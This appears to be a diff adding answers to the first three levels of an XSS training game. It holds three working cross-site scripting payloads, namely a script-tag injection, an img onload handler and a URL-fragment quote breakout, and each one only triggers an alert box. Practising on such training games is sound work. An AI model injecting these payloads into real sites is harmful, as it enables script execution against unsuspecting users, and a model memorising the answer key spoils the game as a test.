@@ -1,0 +1,8 @@
+* Hello, world of XSS
+```><script>alert(12345);</script><```
+
+* Persistence is key
+```<img src="http://pouchdb.com/static/img/mark.svg" onload="javascript:alert(1234);">```
+
+* That sinking feeling…
+```https://xss-game.appspot.com/level3/frame#3'"><script>alert(12345);</script><"'```
